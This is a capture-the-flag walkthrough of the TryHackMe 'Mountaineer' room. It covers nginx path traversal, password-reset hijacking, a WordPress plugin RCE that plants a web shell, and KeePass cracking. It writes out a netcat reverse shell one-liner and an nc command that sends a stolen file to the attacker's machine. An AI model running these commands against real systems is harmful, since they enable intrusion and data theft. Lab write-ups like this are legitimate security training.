
> [!NOTE] Quote
> Everything I lose, creates space for everything I need.

Tags: #Boot2root #tryhackme 
### Recon

During recon we find that a nginx welcome page is running on port 80.
### Enumeration 

On using dirsearch, The output revealed the presence of a **WordPress installation**.

I navigated to `/wordpress/` and found a broken or improperly configured WordPress site. While hovering over some random links on the page, I noticed that they pointed to `mountaineer.thm`, suggesting the website expects a specific virtual host configuration.

Edit the `/etc/hosts` file 

run WPScan to enumerate plugins and potential vulnerabilities. The scan revealed that the site was using a plugin called Modern Events Calendar Lite, which has remote code execution vulnerability documented in exploit DB

```
wpscan --url http://mountaineer.thm/wordpress/ -e u
```


The scan revealed a total of eight users, including k2, which matched the author name found on the website.

### Nginx Off-by-Slash Vulnerability

Since I didn’t gain much from the previous steps, I revisited the dirsearch output and noticed an unusual directory: `/wordpress/images` This path stood out because it's not a standard directory in a typical WordPress installation (or at least not one that usually exposes anything meaningful). When I tried to access the page, it returned a `403` Forbidden error

On intercepting the request and manipulating the path to attempt accessing sensitive files, such as:

```
/wordpress/images../etc/passwd
```

The response returned the contents of `/etc/passwd`, confirming a path traversal vulnerability due to improper handling of URL paths in the web server configuration.

fuzz the vulnerable endpoint to identify other accessible files. I used [[ffuf]] with a wordlist targeting common LFI paths and saved the output to a file:
```sh
ffuf -u 'http://mountaineer.thm/wordpress/images..FUZZ' \
     -w /usr/share/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt \
     -mc 200 -o fuzz.txt
     ```

This command searches for any valid LFI payloads that return a 200 OK response, indicating a successful file read.

To extract only the working paths from the output, I used:

```sh
cut -d'  ' -f1 fuzz.txt > burp_wordlist.txt
```

This generated a clean list of payloads, which can further be used in burp intruder for automating testing.

### Password Reset 

Inside `/var/mail/www-data`, I found an email containing a password reset link for the user Everest.

> However, when I visited the link, it had already expired. The reset page indicated that I could request a new password reset by submitting a username. This gave me an idea — what if I used this same functionality to reset the password for the admin account?

I submitted the username `admin`, and the site responded by saying a reset link had been sent to the registered email.

To intercept that link, I returned to BurpSuite Intruder, using the same [[LFI]] payloads to monitor for new entries in the webmail logs. After scrolling to the bottom of the response from `/var/mail/www-data`, I found a new password reset link , this time for the admin user. Click the link and reset the password 

While reviewing the responses from BurpSuite Intruder, one of the LFI payloads successfully retrieved `/var/log/lastlog`, which contained entries revealing a `hostname:adminroundcubemail.mountaineer.thm`. I added the hostname to my` /etc/hosts `file to resolve it locally, on visiting the domain, I was redirected to a Roundcube webmail login page.

### Roundcube Webmail

The page prompted for a username and password, so I initially attempted default credentials like `admin:admin`, but that didn’t work. Recalling that the admin’s display name in the article was previously identified as K2, I tried logging in with `K2:k2 `— and it worked.

After logging in as K2 we find an email in the inbox containing passwords for K2's account 
, also found in the sent folder a message addressed to a user named Lhotse. The email included several personal details about Lhotse, such as first name, surname, and other identifying information.

> This immediately reminded me of how data is typically structured when using [CUPP](https://github.com/Mebus/cupp) (Common User Passwords Profiler) — a tool that generates personalized wordlists based on user information

#### Exploiting CVE-2021–24145

Earlier I recalled that the site was running a vulnerable plugin:` Modern Events Calendar Lite.` Exploit-DB had a working exploit for authenticated Remote Code Execution.

Since I already had valid admin credentials from earlier enumeration, I used them to log in and run the exploit. It successfully uploaded a web shell (shell.php) to the target server.

The shell used was p0wny@shell, confirming that the exploit worked and we had planted a basic web shell.

To gain a more stable and interactive shell, I executed the following reverse shell payload on the target:
```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <your-ip> <your-port> > /tmp/f
```
Also setup a NC listener `nc -nlvp 4444`

To stabilize the shell and make it interactive, I **ran**
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

Ctrl + Z

stty raw -echo; fg

ENTER
ENTER
```

### Cracking KeePass and Lateral Movement

discovered a user directory at `/home/lhotse` containing an interesting file: `backup.kdbx`, which is a KeePass database file.

transfer the file to yo own machine 
On the victim machine:
```sh
nc <your-ip> <your-port> < Backup.kdbx
```
On the attacker machine:
```sh
nc -lvnp <your-port> > Backup.kdbx
```

Inside the database, I browsed through the entries and found Entry 3, which contained credentials for the user `kangchenjunga`.Cracking the KeePass File
#### making a custom wordlist 

To access the contents of `Backup.kdbx`, I needed to crack its master password. I used `keepass2john` to extract the hash:

```
keepass2john Backup.kdbx > hash.txt
```

Then, I attempted to crack it with John the Ripper using common wordlists like rockyou.txt, but none of them worked

I recalled that the file was located under `lhotse’s` home directory, and based on earlier enumeration, I had access to Roundcube webmail data linked to this user. So I used that contextual information to generate a custom wordlist using `CUpp` (Common User Passwords Profiler):

> I filled in details gathered from Roundcube, such as the user’s full name, email, birthday, etc.

```
john hash.txt --wordlist=file.txt
```

##### KeePass CLI

After successfully cracking the KeePass password, I used `Kpcli` (KeePass CLI) to open the `Backup.kdbx` file. I entered the cracked password, and it worked. Browse around and find the pass for the user 

Try logging in as `kangchenjunga` via ssh. Get the first flag
### Privilege Escalation

Type `ls -la`, we find a file name `bash_history` and on opening that file we see the root password in plain text


### References

https://blog.devops.dev/mountaineer-ctf-tryhackme-writeup-c46a267387e5